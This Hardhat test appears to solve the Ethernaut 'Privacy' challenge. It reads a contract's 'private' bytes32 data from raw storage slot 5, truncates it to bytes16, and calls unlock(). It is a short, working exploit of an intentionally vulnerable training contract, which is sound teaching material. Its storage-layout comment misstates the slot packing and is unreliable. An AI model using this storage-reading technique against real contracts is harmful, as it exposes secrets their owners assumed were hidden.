import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x11343d543778213221516D004ED82C45C3c8788B";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe("Privacy", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("Privacy");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await contractFactory.attach(challengeAddr);
    });

    it("Should solve the challenge", async function () {
        expect(await submitInstance(contract.address)).to.be.false;
        expect(await contract.locked()).to.be.true;


        /*
            variables get packed into storage slots of 32 bytes: 
            bool public locked : 1 byte : storageAt(0)
            uint256 public ID : 32 bytes : storageAt(1)
            uint8 private flattening : 1 byte : storageAt(2)
            uint8 private denomination : 1 byte : storageAt(3)
            uint16 private awkwardness : 2 bytes : storageAt(3)
            bytes32[3] private data : storageAt(4-5-6)
        */
        
        // gets string representation of bytes32 value of the position at addr
        let data: any = await owner.provider?.getStorageAt(contract.address, 5);

        // convert from bytes32 to bytes16 by dropping the 16 trailing bytes
        let slice = data.substring(0, 34);

        txn = await contract.unlock(slice);
        await txn.wait();
        
        expect(await contract.locked()).to.be.false;
        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});